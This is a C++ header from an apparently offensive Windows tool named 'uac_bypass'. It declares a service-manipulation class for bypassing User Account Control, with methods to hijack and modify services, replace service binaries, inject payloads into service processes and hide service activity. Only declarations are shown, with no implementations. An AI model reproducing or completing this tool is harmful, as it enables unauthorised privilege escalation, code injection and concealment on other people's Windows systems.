#ifndef UAC_BYPASS_SERVICE_MANIPULATION_H
#define UAC_BYPASS_SERVICE_MANIPULATION_H

#include <windows.h>
#include <string>
#include <vector>
#include "Logger.h"
#include "Config.h"

namespace uac_bypass {

// Struttura per i dettagli del servizio
struct ServiceDetails {
    std::wstring serviceName;
    std::wstring displayName;
    std::wstring binaryPath;
    std::wstring accountName;
    DWORD startType;
    DWORD serviceType;
    bool isRunning;
    bool isElevated;
};

// Struttura per il contesto del servizio
struct ServiceContext {
    SC_HANDLE scManager;
    SC_HANDLE serviceHandle;
    HANDLE processHandle;
    DWORD processId;
    bool isElevated;
};

// Struttura per la configurazione del servizio
struct ServiceConfig {
    std::wstring commandLine;
    std::wstring loadOrderGroup;
    std::vector<std::wstring> dependencies;
    DWORD desiredAccess;
    DWORD errorControl;
    bool delayedStart;
};

class ServiceManipulation {
public:
    static ServiceManipulation& getInstance();
    
    // Metodi principali
    bool initialize();
    bool elevateViaService();
    bool cleanup();
    
    // Gestione servizi
    bool createService(const ServiceDetails& details);
    bool modifyService(const ServiceDetails& details);
    bool deleteService(const std::wstring& serviceName);
    bool startService();
    bool stopService();
    
    // Operazioni avanzate
    bool injectPayload();
    bool hijackService();
    bool restoreService();
    bool monitorService();

private:
    ServiceManipulation();  // Singleton
    ~ServiceManipulation();
    
    ServiceManipulation(const ServiceManipulation&) = delete;
    ServiceManipulation& operator=(const ServiceManipulation&) = delete;

    // Setup servizio
    bool openSCManager();
    bool openService();
    bool configureService();
    bool setupServiceSecurity();
    
    // Manipolazione servizio
    bool modifyServiceConfig();
    bool modifyServiceBinary();
    bool modifyServiceAccount();
    bool modifyServiceRegistry();
    
    // Gestione processi
    bool createServiceProcess();
    bool injectIntoService();
    bool monitorServiceProcess();
    bool cleanupServiceProcess();
    
    // Protezioni
    bool protectService();
    bool hideServiceActivity();
    bool validateServiceState();
    bool handleServiceError();
    
    // Utility
    bool isServiceAvailable(const std::wstring& serviceName);
    bool getServiceStatus(SERVICE_STATUS& status);
    bool waitForServiceState(DWORD desiredState);
    bool backupServiceConfig();
    
    // Membri
    Logger& logger;
    bool initialized;
    ServiceDetails serviceDetails;
    ServiceContext context;
    ServiceConfig config;
    std::vector<BYTE> originalBinary;
    
    // Costanti
    static constexpr DWORD SERVICE_TIMEOUT = 30000;  // 30 secondi
    static constexpr DWORD MAX_SERVICE_WAIT = 5000;  // 5 secondi
    static constexpr DWORD BUFFER_SIZE = 8192;
};

// Macro per elevazione servizio
#define ELEVATE_VIA_SERVICE() \
    ServiceManipulation::getInstance().elevateViaService()

// Macro per gestione servizio
#define START_SERVICE() \
    ServiceManipulation::getInstance().startService()

} // namespace uac_bypass

#endif // UAC_BYPASS_SERVICE_MANIPULATION_H